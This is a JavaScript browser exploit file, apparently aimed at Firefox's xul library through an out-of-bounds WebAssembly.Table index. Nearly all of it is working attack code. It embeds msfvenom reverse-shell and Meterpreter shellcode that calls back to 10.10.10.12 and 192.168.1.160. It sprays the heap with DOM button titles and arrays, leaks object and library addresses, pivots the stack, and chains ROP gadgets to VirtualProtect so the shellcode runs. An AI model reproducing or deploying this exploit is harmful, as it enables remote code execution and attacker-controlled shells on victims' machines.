
// msfvenom -p windows/shell_reverse_tcp EXITFUNC=process -a x86 LHOST=10.10.10.12 LPORT=443 -f js_le
//var shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u0a0a%u0c0a%u0268%u0100%u89bb%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff");

// msfvenom -p windows/shell_reverse_tcp EXITFUNC=process -a x86 LHOST=192.168.1.160 LPORT=443 -f js_le
//var shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%ua8c0%ua001%u0268%u0100%u89bb%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff");

// msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=445 -f js_le EXITFUNC=process -a x86
var shellcode = unescape("%ue8fc%u008f%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u3114%u0fff%u4ab7%u8b26%u2872%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%u7549%u52ef%u8b57%u1052%u428b%u013c%u8bd0%u7840%uc085%u4c74%ud001%u8b50%u2058%u488b%u0118%u85d3%u74c9%u493c%u348b%u318b%u01ff%u31d6%uacc0%ucfc1%u010d%u38c7%u75e0%u03f4%uf87d%u7d3b%u7524%u58e0%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u58e0%u5a5f%u128b%u80e9%uffff%u5dff%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ue889%ud0ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u0a6a%u0a68%u0a0a%u680c%u0002%ubd01%ue689%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u97d5%u106a%u5756%u9968%u74a5%uff61%u85d5%u74c0%uff0a%u084e%uec75%u67e8%u0000%u6a00%u6a00%u5604%u6857%ud902%u5fc8%ud5ff%uf883%u7e00%u8b36%u6a36%u6840%u1000%u0000%u6a56%u6800%ua458%ue553%ud5ff%u5393%u006a%u5356%u6857%ud902%u5fc8%ud5ff%uf883%u7d00%u5828%u0068%u0040%u6a00%u5000%u0b68%u0f2f%uff30%u57d5%u7568%u4d6e%uff61%u5ed5%uff5e%u240c%u850f%uff70%uffff%u9be9%uffff%u01ff%u29c3%u75c6%uc3c1%uf0bb%ua2b5%u6a56%u5300%ud5ff");

// command in windbg to search the shellcode in the Heap
// s 0 L?0xFFFFFFFF FC E8 82 00 00 00 60 89 E5 31

if(shellcode.length % 2 > 0){
	shellcode += unescape("%u9090");
}

// creation of a new html element to spray the heap
var div_container = document.getElementById("lolid");
div_container.style.cssText = "display:none";
// data will be used to spray the heap
var data;
var junk2 = unescape("%u1010");
//offset = 0x104;
i=0;


// Heap Spray to have a leak of an object in the Heap which contains an address of the xul library
// this Heap Spray will bypass all the checks and at the end of the get function, the object will be leaked somewhere in the Heap Spray
junk = unescape("%u0001%u0000%u1008%u1010"); // 10101008
junk += unescape("%u0000%u0000%u106c%u1010%u1050%u1010%u1010%u1010"); // 10101010
junk += unescape("%u1060%u1010%u1010%u1010%u1040%u1010%u1008%u1010"); // 10101020
junk += unescape("%u0000%u0000%u1028%u1010%u1070%u1010%u1010%u1010"); // 10101030
junk += unescape("%u1010%u1010%uF000%u641F%u0001%u0000%u0FF8%u6410"); // 10101040
junk += unescape("%u10C0%u1010%uF000%u641F%u1060%u1010%u1010%u1010"); // 10101050
junk += unescape("%u1010%u1010%u1010%u1010%u102C%u1010%u1010%u1010"); // 10101060
junk += unescape("%u0000%u0000%u0002%u0000%uFFFF%uFFFF%u0000%u0000"); // 10101070
junk += unescape("%u0000%u0000%ub808%u0125%uFFFF%uFFFF%u0000%u0000"); // 10101080
junk += unescape("%u1010%u1010%u1010%u1010%u0000%u0000%u1010%u1010"); // 10101090
junk += unescape("%u0000%u0000%u1080%u1010%u0001%u0000%u0010%u1010"); // 101010A0
junk += unescape("%u6867%u1010%u1010%u1010%u1010%u1010%u1010%u1010"); // 101010B0
junk += unescape("%u1010%u1010%u1010%u1010%u1010%u1011%u0000%u0000"); // 101010C0
junk += unescape("%u0000%u0000%u1010%u1010%u1010%u1010%u1010%u1010"); // 101010D0


while(junk.length < 0x1000) junk += unescape("%u1010");

data = junk.substring(0,0x800);

while(data.length < 0x80000) data += data;

while(junk2.length < 0x50) junk2 += unescape("%u1010");

junk = data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111");

// create a lot of objects which will contain the Heap Spray
for(i=0; i<0x450; i++) {
	var obj = document.createElement("button");
	obj.id = "button" + i;
	// Heap Spray
	obj.title = data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111");
	div_container.appendChild(obj);
}

// Need to have an address which finish with FFFF0
// but the object before cannot permit it because it is too small
// So we need to create another Heap Spray with arrays to have an address which FFFF0 that we can control

var array = [];

array.push(unescape("%u0000%u0000%u1010%u1010%u1010%u1010%u0000%u0000"));
var test = [];
tmp = 0;
tmp2=0;
tmp3=0;
tmp4=0;
tmp5=0;
j =3;

while(j<(0x80000 - 8)*2) {

	if( (j+1) == (0xFF000/4) ||  (tmp > 0 && (j-tmp)%(0x100000/4) == 0)){
	
		array.push(unescape("%u0001%u0000%u1028%u1010%u1040%u1010%u1010%u1010")); // 642ff000
		array.push(unescape("%u1010%u1010%u1010%u1010%u1008%u1010%u1010%u1010")); // 642ff010
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff020
		array.push(unescape("%u0000%u0000%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff030
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff040
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff050
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff060
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff070
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff080
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff090
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0a0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0b0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0c0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0d0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0e0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff0f0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff100
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff110
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff120
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff130
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff140
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff150
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff160
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff170
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff180
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff190
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1a0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1b0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1c0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1d0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1e0
		array.push(unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010")); // 642ff1f0
		array.push(shellcode); // 642ff200
		tmp = j;
		j+= 4*32 -1 + shellcode.length/2;
	}
	else {
		
		array.push(unescape("%u1010%u1010"));
		
	}
	j++;
}


for(i = 0; i<30; i++) {
	test.push(array.join(""));
}



/*
	VULNERABILITY
*/

setTimeout(function() {
	var table = new WebAssembly.Table({
		element: 'anyfunc',
		initial: 0
	});
	
	var tabexp = table.get(0x02000000);
	
	// retrieve the leak which is somewhere in the Heap Spray
	var add = "";
	var add1 = "";
	var add2 = "";
	
	// parse all the objects which contain the spray
	for(i=0;i<0x450;i++){
		if( div_container.childNodes[i].title[34826] != junk[34826]) {
			add1 = escape(div_container.childNodes[i].title[34827]).replace("%","").replace("u","");
			add2 = escape(div_container.childNodes[i].title[34826]).replace("%","").replace("u","");
		}
	}
	
	add2 = add2.slice(0,-1);
	add2 += "8";
	
	// Now the object leaked has the address add1 + add2
	
	// We need to trigger another time the vulnerability to retrieve an address of the xul library
	// We use the set function which has the same vulnerability than the get function
	
	
	junk = unescape("%u1010%u1010%u1010%u1010"); // 10101008
	//		10101090 in 10101018 is to retrieve the lib address with the oject stored in 10101090 + 4
	junk += unescape("%u0000%u0000%u106c%u1010%u1090%u1010%u0000%u0000"); // 10101010
	junk += unescape("%u1060%u1010%u1010%u1010%u1010%u1010%u1010%u1010"); // 10101020
	junk += unescape("%u1010%u1010%u1010%u1010%u1070%u1010%u1010%u1010"); // 10101030
	junk += unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010"); // 10101040
	junk += unescape("%u10C0%u1010%u1010%u1010%u1010%u1010%u1040%u1010"); // 10101050
	junk += unescape("%u1010%u1010%u1010%u1010%u1010%u1010%u1010%u1010"); // 10101060
	junk += unescape("%u0000%u0000%u0002%u0000%u1010%u1010%u1010%u1010"); // 10101070
	junk += unescape("%u0000%u0000%u1010%u1010%u1010%u1010%u1010%u1010"); // 10101080
	//		10101090 + 4 => contains the object address leaked 
	junk += unescape("%u1010%u1010%u" + add2 + "%u" + add1 + "%u1010%u1010%u1010%u1010"); // 10101090
	junk += unescape("%u1010%u1010%u1080%u1010%u0001%u0000%u1010%u1010"); // 101010A0
	//		92DC01 * 1C = 1010101C
	//		for bypass some checks
	junk += unescape("%u0000%u0000%uDC01%u0092%u1010%u1010%u1010%u1010"); // 101010B0
	
	
	while(junk.length < 0x1000) junk += unescape("%u1010");
	
	data = junk.substring(0,0x800);
	
	while(data.length < 0x80000) data += data;
	
	
	junk = data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111");
	
	
	// reset the Heap Spray with his original content
	for(i=0;i<0x450;i++){
		div_container.childNodes[i].removeAttribute("title");
		div_container.childNodes[i].setAttribute("title",data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111"));
	}
	
	
	setTimeout(function() {
		
		// Trigger the vuln again with the same index that before to be sure that it is in our Heap Spray
		// and with the object returned by the get function because it is a special object and also because this object is in our Heap Spray
		table.set(0x02000000,tabexp);
		
		// Retrieve the address in the xul library
		add = "";
		
		// parse the Heap Spray to retrieve the address which permit us to calculate the base address of the xul library
		for(i=0;i<0x450;i++){
			if( div_container.childNodes[i].title != junk) {
				
				for(j=0;j<junk.length;j++){
					if(escape(div_container.childNodes[i].title[j]) != escape(junk[j])){
						add = escape(div_container.childNodes[i].title[j]).replace("%","").replace("u","") + add;
					}
				}
				
			}
		}
		
		if(add.length > 8){
			add = add.substring(add.length-8,add.length);
		}
		
		// Trigger the vulnerability in the get function to overwritte the EIP and to a stack pivot and after that a ROP Chain to gain code execution
		
		// convert the address to a number to calculate new addresses to make ROPChain
		var add_stack_int = parseInt(add,16);
		
		// offset to retrieve the base address of the xul library
		// offset between the leak and the base address
		var offset_ba = parseInt("24BBBE0",16);
		
		// base address of the xul library
		var ba = add_stack_int - offset_ba;
		
		// offset for stack pivot
		// PUSH EAX; POP ESP; RET
		var offset_stack = parseInt("17E946C",16);
		
		// calculate address to do stack pivot
		// To do these instructions : PUSH EAX, POP ESP, RET
		// it will change the ESP pointer by the value in the EAX register
		var add_stack = (ba + offset_stack).toString(16);
		
		// add some 0 if the address is to small
		while(add_stack.length < 8){
			add_stack = "0" + add_stack;
		}
		
		// address of the Virtual Protect function
		// VirtualProtect(lpAddress, dwSize, flNewProtect, lpfOldProtect)
		// lpAddress = address where we want to change the protection
		// dwSize = number of bytes we want to modify the protection
		// flNewProtect = flag of the new Protection
		// lpfOldProtect = An address which has the write protection to write the old protection ( i think )
		var add_virtual = (parseInt("0990fb5",16) + ba).toString(16);
		
		// in this address we have :
		// push edx
		// push eax
		// push ecx
		// push edi
		// call VirtualProtect
		
		// so edi = lpAdresse
		// ecx = dwSize
		// eax = flNewProtect
		// edx = lpfOldProtect
		
		// add some 0 if the address is to small
		while(add_virtual.length < 8){
			add_virtual = "0" + add_virtual;
		}
		
		// new address of the stack, because it has not larger enough
		/*
			POP ESP; RET
		*/
		var add_stack2 = (parseInt("1D02BB8",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(add_stack2.length < 8){
			add_stack2 = "0" + add_stack2;
		}
		
		// rop gadget 1
		/*
			MOV ECX, DWORD PTR [ECX+20]
			MOV DWORD PTR [EAX], ECX
			POP EBP
			RET 4		=> 	Return to esp - 4
		*/
		// it is to have ECX equal to 10101010
		var rop1 = (parseInt("223BEF1",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(rop1.length < 8){
			rop1 = "0" + rop1;
		}
		
		// rop gadget 2
		/*
			MOV EDX, ECX
			POP ESI
			RET
		*/
		// to have EDX = 10101010 and ESI = 641FF000
		var rop2 = (parseInt("1FE150E",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(rop2.length < 8){
			rop2 = "0" + rop2;
		}
		
		// rop gadget 3
		/*
			MOV EDI, ESI
			POP ECX
			POP ESI
			RET
		*/
		// to have EDI = 641FF000 and ECX = 1000
		var rop3 = (parseInt("234CCD5",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(rop3.length < 8){
			rop3 = "0" + rop3;
		}
		
		// rop gadget 4
		/*
			MOV EAX, 4000h
			POP ESI
			RET
		*/
		var rop4 = (parseInt("0DF932E",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(rop4.length < 8){
			rop4 = "0" + rop4;
		}
		
		// rop gadget 5
		/*
			SHR EAX, 8
			POP EBP
			RET
		*/
		var rop5 = (parseInt("0A55920",16) + ba).toString(16);
		
		// add some 0 if the address is to small
		while(rop5.length < 8){
			rop5 = "0" + rop5;
		}
		
		junk = unescape("%u0000%u0000%u1010%u1010"); // 10101008
		junk += unescape("%u0000%u0000%u106c%u1010%u1040%u1010%u0000%u0000"); // 10101010
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101020
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101030
		junk += unescape("%u0000%u0000%u1010%u1010%u1008%u1010%u0000%u0000"); // 10101040
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 10101050
		junk += unescape("%u0000%u0000%u0000%u0000%u1080%u1010%u0000%u0000"); // 10101060
		junk += unescape("%u0000%u0000%u1020%u1010%u0000%u0000%u0000%u0000"); // 10101070
		
		// ESP will be overwrite by 101010E0
		junk += unescape("%u"+add_stack2.toString(16).substring(4,8)+"%u"+ add_stack2.toString(16).substring(0,4)+"%u10E0%u1010%u1010%u1010%u0000%u0000"); // 10101080
		
		// EIP will be overwrite by an address which permits to do a Stack Pivot by executing PUSH EAX; POP ESP; RET instructions
		junk += unescape("%u"+add_stack.toString(16).substring(4,8)+"%u"+ add_stack.toString(16).substring(0,4)+"%u1010%u1010%u0000%u0000%u0000%u0000"); // 10101090
		junk += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000"); // 101010A0
		junk += unescape("%u1000%u1010%u0000%u0000%u0000%u0000%u0000%u0000"); // 101010B0
		junk += unescape("%u1000%u1010%u0000%u0000%u0000%u0000%u0000%u0000"); // 101010C0
		junk += unescape("%u1000%u1010%u0000%u0000%u0000%u0000%u0000%u0000"); // 101010D0
		
		// ROPChain
		// @rop1 + EBP + @rop2 + 4 bytes because of RET 4 in the ROP 1
		junk += unescape("%u" + rop1.substring(4,8) + "%u" + rop1.substring(0,4) + "%u0000%u0000" + "%u" + rop2.substring(4,8) + "%u" + rop2.substring(0,4) + "%u0000%u0000"); // 101010E0
		// ESI + @rop3 + ECX + ESI
		junk += unescape("%uF000%u641F%u" + rop3.substring(4,8) + "%u" + rop3.substring(0,4) + "%u1000%u0000%u0000%u0000" ); // 101010F0
		// @rop4 + ESI + @rop5 + EBP
		junk += unescape("%u" + rop4.substring(4,8) + "%u" + rop4.substring(0,4) + "%u0000%u0000%u" + rop5.substring(4,8) + "%u" + rop5.substring(0,4) + "%u111C%u1010"); // 10101100
		// @virtualProtect + EDI + ESI + EBP
		junk += unescape("%u" + add_virtual.substring(4,8) + "%u" + add_virtual.substring(0,4) + "%u0000%u0000%u0000%u0000%u111C%u1010"); // 10101110
		// @shellcode + ...
		junk += unescape("%uF200%u641F%u1010%u1010%u1010%u1010%u1010%u1010"); // 10101120
		
		
		
		while(junk.length < 0x1000) junk += unescape("%u1010");
		
		data = junk.substring(0,0x800); 
		
		while(data.length < 0x80000) data += data;
		
		while(junk2.length < 0x50) junk2 += unescape("%u1010");
		
		junk = data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111");
	
	
		// reset the Heap Spray with new values to control EIP and make a ROPChain
		for(i=0;i<0x450;i++){
			div_container.childNodes[i].removeAttribute("title");
			div_container.childNodes[i].setAttribute("title",data.substring(0,0x80000 - 0x58) + junk2.substring(0,76) + unescape("%u0000%u0000%u1111%u1111"));
		}
		
		setTimeout(function() {
			table = new WebAssembly.Table({
				element: 'anyfunc',
				initial: 0
			});
			
			table.get(0x02000000);
		},100);
		
		
	},100);
	
	
},100);

